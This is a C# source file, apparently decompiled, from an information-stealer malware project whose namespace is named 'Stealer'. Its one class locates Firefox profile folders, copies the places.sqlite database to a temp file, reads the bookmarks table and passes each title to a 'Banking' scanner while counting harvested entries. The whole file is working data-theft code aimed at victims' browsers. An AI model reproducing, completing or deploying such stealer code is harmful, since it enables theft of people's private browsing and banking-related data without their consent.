using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Firefox
{
	// Token: 0x0200001A RID: 26
	internal class cBookmarks
	{
		// Token: 0x06000085 RID: 133 RVA: 0x00005CF0 File Offset: 0x00003EF0
		private static string GetBookmarksDBPath(string path)
		{
			try
			{
				string text = path + "\\Profiles";
				bool flag = Directory.Exists(text);
				if (flag)
				{
					foreach (string text2 in Directory.GetDirectories(text))
					{
						bool flag2 = File.Exists(text2 + "\\places.sqlite");
						if (flag2)
						{
							return text2 + "\\places.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00005D90 File Offset: 0x00003F90
		public static List<Bookmark> Get(string path)
		{
			List<Bookmark> list = new List<Bookmark>();
			try
			{
				string bookmarksDBPath = cBookmarks.GetBookmarksDBPath(path);
				bool flag = !File.Exists(bookmarksDBPath);
				if (flag)
				{
					return list;
				}
				string text = Path.GetTempPath() + "\\places.raw";
				bool flag2 = File.Exists(text);
				if (flag2)
				{
					File.Delete(text);
				}
				File.Copy(bookmarksDBPath, text);
				SQLite sqlite = new SQLite(text);
				sqlite.ReadTable("moz_bookmarks");
				bool flag3 = sqlite.GetRowCount() == 65536;
				if (flag3)
				{
					return new List<Bookmark>();
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Bookmark bookmark = default(Bookmark);
					bookmark.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 5));
					bool flag4 = Crypto.GetUTF8(sqlite.GetValue(i, 1)).Equals("0") && bookmark.sTitle != "0";
					if (flag4)
					{
						Banking.ScanData(bookmark.sTitle);
						Counter.Bookmarks++;
						list.Add(bookmark);
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}
			return new List<Bookmark>();
		}
	}
}
